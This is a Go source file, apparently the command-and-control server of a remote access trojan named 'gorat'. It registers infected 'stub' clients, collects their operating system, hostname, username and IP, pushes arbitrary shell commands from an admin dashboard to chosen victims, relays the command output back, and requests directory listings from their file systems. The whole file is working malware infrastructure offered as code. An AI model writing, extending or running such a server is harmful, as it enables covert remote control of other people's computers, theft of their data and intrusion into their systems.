package server

import (
	"encoding/json" // For marshalling shell_output_from_stub and other messages
	"errors"        // For ErrClientNotFound
	"log"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/rs/xid" // For unique IDs
	"gorat/pkg/common"
)

// ErrClientNotFound is returned when a client is not found.
var ErrClientNotFound = errors.New("client not found")

// ClientInfo holds information about a connected stub.
type ClientInfo struct {
	ID          string `json:"ID"`
	RemoteAddr  string `json:"RemoteAddr"`
	OS          string `json:"OS,omitempty"`
	Hostname    string `json:"Hostname,omitempty"`
	Username    string `json:"Username,omitempty"`
	IP          string `json:"IP,omitempty"`
	Status      string `json:"Status"`
	LastSeen    time.Time `json:"LastSeen"`
	StubConn    *websocket.Conn `json:"-"`
}

// ClientManager manages active clients and admin dashboard connections.
type ClientManager struct {
	clients        map[string]*ClientInfo
	adminConns     map[*websocket.Conn]bool
	mu             sync.RWMutex
	broadcastAdmin chan []byte // Channel to send updates to admin dashboards
}

// Global instance of ClientManager
var ClientMgr *ClientManager

func init() {
	ClientMgr = NewClientManager()
	go ClientMgr.broadcastToAdminsLoop()
}

// NewClientManager creates a new ClientManager.
func NewClientManager() *ClientManager {
	return &ClientManager{
		clients:        make(map[string]*ClientInfo),
		adminConns:     make(map[*websocket.Conn]bool),
		broadcastAdmin: make(chan []byte, 256),
	}
}

// RegisterClient adds a new client (stub) to the manager.
func (cm *ClientManager) RegisterClient(conn *websocket.Conn) *ClientInfo {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	clientID := xid.New().String()
	client := &ClientInfo{
		ID:          clientID,
		RemoteAddr:  conn.RemoteAddr().String(),
		Status:      "Connected",
		LastSeen:    time.Now(),
		StubConn:    conn,
	}
	cm.clients[clientID] = client
	log.Printf("Stub client connected: %s (%s)", clientID, client.RemoteAddr)
	cm.notifyAdminsClientUpdate()
	return client
}

// UnregisterClient removes a client from the manager.
func (cm *ClientManager) UnregisterClient(clientID string) {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	_, exists := cm.clients[clientID]
	if exists {
		log.Printf("Stub client disconnected: %s", clientID)
		delete(cm.clients, clientID)
		cm.notifyAdminsClientUpdate()
	}
}

// UpdateClientFullInfo updates all gathered details of a client after receiving sysinfo.
func (cm *ClientManager) UpdateClientFullInfo(clientID, os, hostname, username, ip string) {
	cm.mu.Lock()
	defer cm.mu.Unlock()

	client, exists := cm.clients[clientID]
	if exists {
		client.OS = os
		client.Hostname = hostname
		client.Username = username
		client.IP = ip
		client.LastSeen = time.Now()
		log.Printf("Updated full client info for %s: OS=%s, Hostname=%s, User=%s, IP=%s", clientID, os, hostname, username, ip)
		cm.notifyAdminsClientUpdate()
	}
}

// HandleClientMessages reads messages from a stub client.
func (cm *ClientManager) HandleClientMessages(client *ClientInfo) {
	defer func() {
		cm.UnregisterClient(client.ID)
		client.StubConn.Close()
		log.Printf("Closed connection for client %s from %s", client.ID, client.RemoteAddr)
	}()

	for {
		var msg common.Message
		err := client.StubConn.ReadJSON(&msg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure, websocket.CloseNoStatusReceived) {
				log.Printf("Error reading message from client %s (%s): %v", client.ID, client.RemoteAddr, err)
			} else {
				log.Printf("Client %s (%s) disconnected: %v", client.ID, client.RemoteAddr, err)
			}
			break
		}

		log.Printf("Received message from client %s: Type=%s", client.ID, msg.Type)

		switch msg.Type {
		case "sysinfo_report":
			payloadMap, ok := msg.Payload.(map[string]interface{})
			if !ok {
				log.Printf("Error: sysinfo_report payload from client %s is not a map: %+v", client.ID, msg.Payload)
				continue
			}
			var os, hostname, username, ip string
			if val, k := payloadMap["os"].(string); k { os = val }
			if val, k := payloadMap["hostname"].(string); k { hostname = val }
			if val, k := payloadMap["username"].(string); k { username = val }
			if val, k := payloadMap["ip"].(string); k { ip = val }
			cm.UpdateClientFullInfo(client.ID, os, hostname, username, ip)

		case "shell_output":
			outputPayload, ok := msg.Payload.(map[string]interface{})
			if !ok {
				log.Printf("Error: shell_output payload from client %s is not a map: %+v", client.ID, msg.Payload)
				continue
			}
			
			adminMessage := common.Message{
				Type: "shell_output_from_stub", // New type for admin UI
				Payload: map[string]interface{}{
					"client_id": client.ID,                 // So admin UI knows which client
					"output":    outputPayload["output"],   // From stub's HandleRemoteShellCommand
					"error":     outputPayload["error"],    // From stub's HandleRemoteShellCommand
				},
			}
			jsonData, err := json.Marshal(adminMessage)
			if err != nil {
				log.Printf("Error marshalling shell_output_from_stub for admin: %v", err)
				continue
			}
			cm.broadcastAdmin <- jsonData // Send to all connected admin dashboards

		default:
			log.Printf("Unknown message type '%s' from client %s. Payload: %+v", msg.Type, client.ID, msg.Payload)
			ackPayload := "Message type '" + msg.Type + "' received by server"
			err = client.StubConn.WriteJSON(common.Message{Type: "ack", Payload: ackPayload})
			if err != nil {
				log.Printf("Error sending ack to client %s: %v", client.ID, err)
				break
			}
		}
	}
}

// SendCommandToClient sends a command to a specific client.
// adminConn is the connection of the admin who sent the command (for logging/attribution).
func (cm *ClientManager) SendCommandToClient(clientID string, command string, adminConn *websocket.Conn) error {
	cm.mu.RLock() // Read lock for accessing cm.clients
	client, exists := cm.clients[clientID]
	cm.mu.RUnlock()

	if !exists || client.StubConn == nil {
		log.Printf("Client %s not found or connection is nil for command by admin %s.", clientID, adminConn.RemoteAddr())
		return ErrClientNotFound 
	}

	cmdMsg := common.Message{
		Type:    "shell_command",
		Payload: command,
	}

	// Note: gorilla/websocket connections are safe for one concurrent writer and one concurrent reader.
	// Assuming this function is the primary path for writing commands to the stub, it should be okay.
	// If multiple admins could trigger this for the same client simultaneously, client.StubConn.WriteJSON
	// itself needs to be concurrency-safe or have an external lock per client.
	// For now, WriteJSON is internally synchronized by gorilla/websocket for one writer.
	err := client.StubConn.WriteJSON(cmdMsg)
	if err != nil {
		log.Printf("Error sending shell_command to client %s (admin: %s): %v", clientID, adminConn.RemoteAddr(), err)
		// Consider triggering unregister logic if write fails, as connection might be dead.
		return err
	}
	log.Printf("Sent shell_command '%s' to client %s (from admin: %s)", command, clientID, adminConn.RemoteAddr())
	return nil
}


// SendFMListDirRequestToClient sends a file manager list directory request to a specific client.
func (cm *ClientManager) SendFMListDirRequestToClient(clientID string, path string, adminConn *websocket.Conn) error {
	cm.mu.RLock()
	client, exists := cm.clients[clientID]
	cm.mu.RUnlock()

	if !exists || client.StubConn == nil {
		log.Printf("Client %s not found or connection is nil for fm_list_dir by admin %s.", clientID, adminConn.RemoteAddr())
		return ErrClientNotFound
	}

	fmReqMsg := common.Message{
		Type:    "fm_list_dir_request",
		Payload: path,
	}

	err := client.StubConn.WriteJSON(fmReqMsg)
	if err != nil {
		log.Printf("Error sending fm_list_dir_request to client %s (admin: %s): %v", clientID, adminConn.RemoteAddr(), err)
		return err
	}
	log.Printf("Sent fm_list_dir_request for path '%s' to client %s (from admin: %s)", path, clientID, adminConn.RemoteAddr())
	return nil
}


// RegisterAdminConnection adds an admin dashboard WebSocket connection.
func (cm *ClientManager) RegisterAdminConnection(conn *websocket.Conn) {
	cm.mu.Lock()
	cm.adminConns[conn] = true
	cm.mu.Unlock()
	log.Printf("Admin dashboard connected: %s. Total admins: %d", conn.RemoteAddr(), len(cm.adminConns))
	cm.sendClientListToAdmin(conn)
}

// UnregisterAdminConnection removes an admin dashboard WebSocket connection.
func (cm *ClientManager) UnregisterAdminConnection(conn *websocket.Conn) {
	cm.mu.Lock()
	delete(cm.adminConns, conn)
	cm.mu.Unlock()
	log.Printf("Admin dashboard disconnected: %s. Total admins: %d", conn.RemoteAddr(), len(cm.adminConns))
}

// notifyAdminsClientUpdate sends the current list of clients to all admin dashboards.
func (cm *ClientManager) notifyAdminsClientUpdate() {
	cm.mu.RLock()
	clientsData := make([]*ClientInfo, 0, len(cm.clients))
	for _, client := range cm.clients {
		clientCopy := *client
		clientsData = append(clientsData, &clientCopy)
	}
	cm.mu.RUnlock()

	updateMsg := struct {
		Type    string        `json:"type"`
		Payload []*ClientInfo `json:"payload"`
	}{
		Type:    "client_list",
		Payload: clientsData,
	}
	jsonData, err := json.Marshal(updateMsg)
	if err != nil {
		log.Printf("Error marshalling client list for admin update: %v", err)
		return
	}
	cm.broadcastAdmin <- jsonData
}

// sendClientListToAdmin sends the full client list to a single admin connection.
func (cm *ClientManager) sendClientListToAdmin(conn *websocket.Conn) {
	cm.mu.RLock()
	clientsData := make([]*ClientInfo, 0, len(cm.clients))
	for _, client := range cm.clients {
		clientCopy := *client
		clientsData = append(clientsData, &clientCopy)
	}
	cm.mu.RUnlock()

	clientListMsg := struct {
		Type    string        `json:"type"`
		Payload []*ClientInfo `json:"payload"`
	}{
		Type:    "client_list",
		Payload: clientsData,
	}
	jsonData, err := json.Marshal(clientListMsg)
	if err != nil {
		log.Printf("Error marshalling client list for single admin: %v", err)
		return
	}
	
	go func(c *websocket.Conn, data []byte) {
		cm.mu.RLock()
		registered := cm.adminConns[c]
		cm.mu.RUnlock()
		if !registered { return }
		if err := c.WriteMessage(websocket.TextMessage, data); err != nil {
			log.Printf("Error sending client list to admin %s: %v", c.RemoteAddr(), err)
		}
	}(conn, jsonData)
}

// broadcastToAdminsLoop listens on the broadcastAdmin channel and sends messages to all connected admins.
func (cm *ClientManager) broadcastToAdminsLoop() {
	for data := range cm.broadcastAdmin {
		cm.mu.RLock()
		currentAdmins := make([]*websocket.Conn, 0, len(cm.adminConns))
		for conn := range cm.adminConns {
			currentAdmins = append(currentAdmins, conn)
		}
		cm.mu.RUnlock()

		for _, conn := range currentAdmins {
			go func(c *websocket.Conn, d []byte) {
				cm.mu.RLock()
				stillRegistered := cm.adminConns[c]
				cm.mu.RUnlock()
				if !stillRegistered { return }
				if err := c.WriteMessage(websocket.TextMessage, d); err != nil {
					log.Printf("Error broadcasting to admin %s: %v.", c.RemoteAddr(), err)
				}
			}(conn, data)
		}
	}
}
